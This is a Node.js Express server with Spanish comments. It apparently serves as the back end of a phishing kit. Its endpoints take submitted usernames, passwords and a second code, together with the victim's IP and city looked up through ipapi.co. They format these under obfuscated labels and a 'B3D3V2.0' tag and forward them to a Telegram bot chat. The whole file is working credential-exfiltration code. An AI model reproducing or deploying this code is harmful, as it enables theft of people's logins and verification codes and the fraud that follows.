const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Importar cors
const axios = require('axios');
const app = express();
const https = require("https");
const agent = new https.Agent({ family: 4 });



// Al inicio, después de crear la app
app.use(cors({
    origin: '*',             // ← en producción puedes poner dominios específicos
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: false
}));

// Muy importante: manejar preflight (OPTIONS)
app.options('*', cors());   // ← esto resuelve la mayoría de los bloqueos preflight

app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get('/', (req, res) => {
    res.send('Servidor activo');
});

// ... resto del código ...

app.get('/api/get-location', async (req, res) => {
    try {
        // La IP real del cliente viene en estos headers (Railway / proxies)
        const clientIp = 
            req.headers['cf-connecting-ip'] || 
            req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
            req.socket.remoteAddress || 
            'unknown';

        const ipToUse = clientIp === '::1' || clientIp === '127.0.0.1' ? '8.8.8.8' : clientIp;

        const geoResponse = await axios.get(`https://ipapi.co/${ipToUse}/json/`);
        
        res.json({
            ip: ipToUse,
            city: geoResponse.data.city || 'Desconocida',
            // puedes agregar más campos si quieres
        });
    } catch (error) {
        console.error('Error obteniendo ubicación:', error.message);
        res.status(500).json({ ip: 'unknown', city: 'Desconocida' });
    }
});
app.post('/api/sendMessage', async (req, res) => {
    const { user, password, ip, city } = req.body;

    if (!user || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔴B3D3V2.0🔴\nUs4RX: ${user}\nContR: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
       const response = await axios.post(
  `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
  {
    chat_id: CHAT_ID,
    text: message,
  },
  { httpsAgent: agent }
);
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage2', async (req, res) => {
    const { user, password, ip, city } = req.body;

    if (!user || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔐🔴B3D3V2.0🔴\nUs4RX: ${user}\nC0D33: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(
  `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
  {
    chat_id: CHAT_ID,
    text: message,
  },
  { httpsAgent: agent }
);
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});





const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
